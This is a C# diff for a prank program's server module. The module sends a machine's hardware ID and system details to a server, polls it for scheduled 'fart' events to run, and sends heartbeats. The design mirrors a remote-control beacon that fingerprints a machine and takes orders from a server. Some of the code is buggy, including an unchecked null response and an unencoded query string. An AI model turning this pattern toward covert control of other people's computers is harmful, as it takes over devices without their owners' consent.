@@ -1,5 +1,6 @@
 ﻿using Newtonsoft.Json;
 using System;
+using System.Collections.Generic;
 using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
@@ -11,25 +12,25 @@ namespace zort
         private const string SERVER_URL = "localhost:3000";
         private readonly Thread ServerThread = new Thread(ServerRoutine);
 
-
         public ElevationType ElevationType => ElevationType.Both;
 
         public string ModuleName => "ServerConnection";
 
-        public async void Start()
+        public void Start()
         {
             ServerThread.Start();
         }
 
         public void Stop()
         {
-            if(ServerThread.IsAlive)
+            if (ServerThread.IsAlive)
             {
                 ServerThread.Abort();
             }
         }
         private static async void ServerRoutine()
         {
+            List<Zort.FartSchedule> FartsAccountedFor = new List<Zort.FartSchedule>();
             //send data to /log endpoint on startup
             //fetch /heartbeat endpoint every 5 seconds
 
@@ -37,81 +38,93 @@ namespace zort
             SystemInfo info = SysInfoHelper.Get();
 
         sendSysData:
-            if (await LogDataAsync($"http://{SERVER_URL}/log", HWID, JsonConvert.SerializeObject(info)))
+            var response = await SendRequestAsync("/log", new { hwid = HWID, sysdata = JsonConvert.SerializeObject(info) });
+            if (response.IsSuccessStatusCode)
             {
-                ModuleLogger.Log(typeof(ServerCon), "Log sent successfully.");
+                ModuleLogger.Log(typeof(ServerCon), "System info sent successfully.");
             }
             else
             {
-                ModuleLogger.Log(typeof(ServerCon), "Failed to send data. Retrying in 5 seconds...");
+                ModuleLogger.Log(typeof(ServerCon), "Failed to send system info. Retrying in 5 seconds...");
                 await Task.Delay(5000);
                 goto sendSysData;
             }
 
-        sendHeartbeat:
-            await sendHeartbeat($"http://{SERVER_URL}/heartbeat", HWID);
-            await Task.Delay(5000);
-            goto sendHeartbeat;
-        }
-
-        static async Task<bool> LogDataAsync(string url, string hwid, string sysData)
-        {
-            using (HttpClient client = new HttpClient())
+        getScheduledFarts:
+            response = await SendRequestAsync("/getFarts", new { hwid = HWID });
+            if (!response.IsSuccessStatusCode)
             {
-                try
+                ModuleLogger.Log(typeof(ServerCon), "Failed to receive scheduled farts. Retrying in 5 seconds...");
+                return;
+            }
+
+            try
+            {
+
+                var jsonResponse = await response.Content.ReadAsStringAsync();
+                List<Zort.FartSchedule> scheduledFarts = new List<Zort.FartSchedule>();
+                dynamic jObj = JsonConvert.DeserializeObject(jsonResponse);
+                if (jObj == null || jObj.farts == null)
                 {
-                    // Construct the URL with query parameters
-                    var requestUrl = $"{url}?hwid={hwid}&sysData={sysData}";
+                    ModuleLogger.Log(typeof(ServerCon), "No scheduled farts found.");
+                    goto sendHeartbeat;
+                }
 
-                    // Send the POST request
-                    HttpResponseMessage response = await client.PostAsync(requestUrl, null);
-
-                    // Check if the response is successful
-                    if (response.IsSuccessStatusCode)
+                for (int i = 0; i < jObj.farts.Count; i++)
+                {
+                    var fartSchedule = new Zort.FartSchedule
                     {
-                        ModuleLogger.Log(typeof(ServerCon), $"Data sent successfully: HWID = {hwid}, SysData = {sysData}");
-                        return true;
-                    }
+                        Type = (Zort.FartType)Enum.Parse(typeof(Zort.FartType), ((string)jObj.farts[i].type)),
+                        Timestamp = DateTimeOffset.FromUnixTimeSeconds((long)jObj.farts[i].timestamp).UtcDateTime
+                    };
+                    scheduledFarts.Add(fartSchedule);
+                }
+
+                foreach (var fartSchedule in scheduledFarts)
+                {
+                    // Check if the fart is already scheduled
+                    if (FartsAccountedFor.Exists(f => f.Timestamp == fartSchedule.Timestamp && f.Type == fartSchedule.Type)) continue;
                     else
                     {
-                        ModuleLogger.Log(typeof(ServerCon), $"Failed to send data. Status Code: {response.StatusCode}");
-                        return false;
+                        Zort.ScheduledFart(fartSchedule);
+                        FartsAccountedFor.Add(fartSchedule);
                     }
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"An error occurred: {ex.Message}");
-                    return false;
                 }
             }
+            catch (JsonException ex)
+            {
+                ModuleLogger.Log(typeof(ServerCon), $"Failed to parse scheduled farts: {ex.Message}");
+            }
+
+        sendHeartbeat:
+            await SendRequestAsync("/heartbeat", new { hwid = HWID });
+            await Task.Delay(5000);
+            goto getScheduledFarts;
         }
 
-        static async Task<bool> sendHeartbeat(string url, string hwid)
+        static async Task<HttpResponseMessage> SendRequestAsync(string endpoint, dynamic data)
         {
             using (HttpClient client = new HttpClient())
             {
                 try
                 {
-                    // Construct the URL with query parameters
-                    var requestUrl = $"{url}?hwid={hwid}";
+                    // Construct the URL with query parameters from the data object
+                    var requestUrl = $"http://{SERVER_URL}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
+                    foreach (var property in data.GetType().GetProperties())
+                    {
+                        requestUrl += $"{property.Name}={property.GetValue(data)}&";
+                    }
+                    requestUrl = requestUrl.TrimEnd('&');
+
                     // Send the POST request
                     HttpResponseMessage response = await client.GetAsync(requestUrl);
-                    // Check if the response is successful
-                    if (response.IsSuccessStatusCode)
-                    {
-                        Console.WriteLine($"Heartbeat sent successfully: HWID = {hwid}");
-                        return true;
-                    }
-                    else
-                    {
-                        Console.WriteLine($"Failed to send heartbeat. Status Code: {response.StatusCode}");
-                        return false;
-                    }
+
+                    return response;
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine($"An error occurred: {ex.Message}");
-                    return false;
+                    return null;
                 }
             }
         }
